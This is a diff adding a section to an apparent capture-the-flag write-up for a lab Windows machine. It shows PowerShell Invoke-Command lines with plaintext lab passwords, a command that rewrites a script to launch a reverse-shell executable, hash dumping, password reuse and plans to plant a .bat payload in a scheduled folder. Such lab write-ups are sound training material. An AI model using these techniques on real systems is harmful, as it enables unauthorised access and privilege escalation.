@@ -139,3 +139,133 @@ Now let click on run and execute the payload on the target.
 ![image](https://user-images.githubusercontent.com/69868171/156191791-cf235a00-0a30-4930-976b-da43b6698f8c.png)
 
 Now that we a meterpreter shell let use the `screenshare` command to see what has taken place on the target 
+
+![image](https://user-images.githubusercontent.com/69868171/156195015-5f16af53-b0fb-4dfa-a7ec-a533c8bd04f1.png)
+
+We can confirm the streaming on browser.
+
+![image](https://user-images.githubusercontent.com/69868171/156195224-a05fca02-33f5-4954-9ee0-810539850602.png)
+
+![image](https://user-images.githubusercontent.com/69868171/156195594-7e3b1589-e0ec-441f-89ea-571fa5735dc8.png)
+
+![image](https://user-images.githubusercontent.com/69868171/156196003-70db333c-6b5f-44fe-a5bb-430eca7391e6.png)
+
+Now we just need to create the same object and use `Invoke-Command` to execute commands has user `imonks`
+
+```
+$passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $passwd)
+
+invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {whoami} -credential $cred
+```
+
+![image](https://user-images.githubusercontent.com/69868171/156196871-808ddbb0-6c26-49da-8773-684ea373cb52.png)
+
+Now boom we can execute command has `imonks` now let enumerate more.
+
+![image](https://user-images.githubusercontent.com/69868171/156197088-fd301e4f-a1ef-4c5f-be53-674f970f16f2.png)
+
+```
+invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {ls /users} -credential $cred
+```
+
+We have more users to eumerate let hit it.
+
+![image](https://user-images.githubusercontent.com/69868171/156197461-dba8bda9-0170-459a-94f0-11ab59b7eacd.png)
+
+```
+invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {ls /users/imonks/desktop} -credential $cred
+```
+Boom we have `user.txt` also seems we have a powershell script let `cat` it to see what we have inside.
+
+
+![image](https://user-images.githubusercontent.com/69868171/156198047-609c987b-30e0-4aad-ab3b-92b1369d5dda.png)
+
+Now that scripts look promising seems it a script that contain `jmorgan` password we can see it in the object it possible to execute command has `jmorgan` if we run the script. So what we need to do is edit `Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds` remove `Get-Volume` and add a path to our reverse shell executable file.
+
+```
+Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{((Get-Content "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\rev.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred
+```
+
+![image](https://user-images.githubusercontent.com/69868171/156200095-baec8602-7051-4539-912e-cf9ef0dc0858.png)
+
+Now we can execute it with `invoke-command` again.
+
+```
+invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {C:\Users\imonks\Desktop\wm.ps1} -credential $cred
+```
+
+![image](https://user-images.githubusercontent.com/69868171/156200437-1ca2a7b7-2131-4226-b88e-6f8baea3b069.png)
+
+Now back to check our listener.
+
+![image](https://user-images.githubusercontent.com/69868171/156200533-9455ec40-8aa9-4ef1-8a78-7df4f3b92aae.png)
+
+Boom we shell has `jmorgan` cool now let check which localgroup `jmorgan` is on.
+
+![image](https://user-images.githubusercontent.com/69868171/156201080-1c0d4340-ce87-4cb3-b5d3-5ae25a7e6719.png)
+
+Now we know `jmorgan` is part of administrator group we can dump the hashes.
+
+![image](https://user-images.githubusercontent.com/69868171/156201928-2f30d2c1-1b69-4072-a6d2-2df4266590ab.png)
+
+Now let crack the `administrator` hash .
+
+![image](https://user-images.githubusercontent.com/69868171/156203506-222a89f8-d77e-42fc-b88f-99c32f5bc8c4.png)
+
+But the issue is when i try to use on the `administrator` it a dead end so let try password reuse on each users we know we have no access to yet use powershell script just like the first time setting object and using the `invoke-command` .
+
+A flashback if i can remember we found some new users `ATSSERVER` why not let give it a try with the usernames.
+
+![image](https://user-images.githubusercontent.com/69868171/156208089-6396dd6f-56af-4ab6-9c15-be2ae943059f.png)
+
+```
+$passwd = ConvertTo-SecureString "Password@123" -AsPlainText -Force
+
+$cred = New-Object System.Management.Automation.PSCredential ("acute\awallace", $passwd)
+
+invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {whoami} -credential $cred
+```
+Boom work for user `awallace` more enumeration now.
+
+![image](https://user-images.githubusercontent.com/69868171/156208549-84e6aecb-df53-4d24-a9a3-efd9c81059c2.png)
+
+![image](https://user-images.githubusercontent.com/69868171/156208723-970dfafc-0a04-4954-824f-f86dfadce0a0.png)
+
+```
+invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {ls /"program files"} -credential $cred
+```
+
+Now that folder look strange and interesting `keepmeon` let check what we have in it.
+
+```
+invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {ls /"program files"/keepmeon} -credential $cred
+```
+
+![image](https://user-images.githubusercontent.com/69868171/156209268-bc5b5aa9-f0ff-437b-9664-37cd545799b2.png)
+
+Now we have a `bat` file let `cat` to see what the `keepmeon.bat` doing.
+
+![image](https://user-images.githubusercontent.com/69868171/156209685-e27414c2-f51f-4f49-ad8f-35e6094d24a0.png)
+
+
+```
+invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {cat /"program files"/keepmeon/keepmeon.bat} -credential $cred
+```
+
+Now that seems like a job keep running every 5min just like a `cronjob` in linux probably these one is scheduled to run every 5 min which is cool i guess.
+
+```
+REM This is run every 5 minutes. For Lois use ONLY
+
+@echo off
+
+ for /R %%x in (*.bat) do (
+
+ if not "%%x" == "%~0" call "%%x"
+
+)
+```
+
+Let me break it down any file ending with `.bat` would run every 5 min since we are in the `keepmeon` folder so it possible to create a payload in a `bat` format which can give access to `lois` now back to the doc file we got first.
+
